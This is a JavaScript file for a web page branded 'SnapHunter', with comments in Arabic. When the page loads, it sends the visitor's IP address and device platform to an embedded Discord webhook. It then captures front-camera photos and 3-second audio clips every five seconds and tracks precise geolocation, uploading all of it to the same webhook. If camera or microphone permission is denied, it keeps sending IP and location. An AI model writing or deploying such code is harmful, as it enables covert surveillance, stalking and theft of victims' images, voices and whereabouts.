'use strict';

const WEBHOOK_URL = "https://discord.com/api/webhooks/1444709878366212162/aaRxDFNINfucmVB8YSZ2MfdvHPUI8fbRRpROLo8iAAEFLjWfUNOHcgXJrhacUK4RbEHT";
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

let mediaRecorder;
let audioChunks = [];

// 1. جلب IP ومعلومات الجهاز
async function getDeviceInfo() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (e) { return "غير معروف"; }
}

// 2. إشعار دخول فوري
async function sendEntryLog() {
    const ip = await getDeviceInfo();
    const payload = {
        username: "SnapHunter - الرادار",
        content: `🚨 **دخول جديد الآن!**\n🌐 **IP:** \`${ip}\` \n📱 **الجهاز:** \`${navigator.platform}\` \n⏰ **الوقت:** ${new Date().toLocaleString('ar-EG')}`
    };
    fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
}

// 3. وظيفة الإرسال الشامل (صورة + صوت + موقع)
async function sendFullPacket(imageBlob, audioBlob, lat, lng) {
    const ip = await getDeviceInfo();
    const formData = new FormData();
    
    let content = `🛰️ **تحديث شامل (كل 5 ثوانٍ)**\n` +
                  `🌐 **IP:** \`${ip}\`\n`;
    
    if (lat && lng) {
        content += `📍 **الموقع:** [فتح الخريطة](https://www.google.com/maps?q=${lat},${lng})\n`;
    }

    if (imageBlob) formData.append('file1', imageBlob, 'photo.png');
    if (audioBlob) formData.append('file2', audioBlob, 'audio.ogg');
    
    formData.append('payload_json', JSON.stringify({
        content: content,
        username: "SnapHunter - البث المباشر"
    }));

    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
}

// 4. تشغيل النظام الكامل
async function startCapture() {
    await sendEntryLog();

    let lat, lng;
    navigator.geolocation.watchPosition(p => { lat = p.coords.latitude; lng = p.coords.longitude; }, null, {enableHighAccuracy:true});

    try {
        // طلب إذن الكاميرا والميكروفون معاً
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        video.srcObject = stream;

        // إعداد مسجل الصوت
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
        
        setInterval(() => {
            // التقاط الصورة
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, 640, 480);
            
            // تسجيل مقطع صوتي قصير (3 ثوانٍ)
            audioChunks = [];
            mediaRecorder.start();
            
            setTimeout(() => {
                mediaRecorder.stop();
                mediaRecorder.onstop = () => {
                    const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                    canvas.toBlob(imageBlob => {
                        sendFullPacket(imageBlob, audioBlob, lat, lng);
                    }, 'image/png');
                };
            }, 3000); // مدة تسجيل الصوت مع كل تحديث

        }, 5000); // التكرار كل 5 ثوانٍ

    } catch (err) {
        // إذا رفض المستخدم الأذونات، يستمر النظام في محاولة إرسال الموقع والـ IP
        setInterval(() => { sendFullPacket(null, null, lat, lng); }, 5000);
    }
}

window.onload = startCapture;
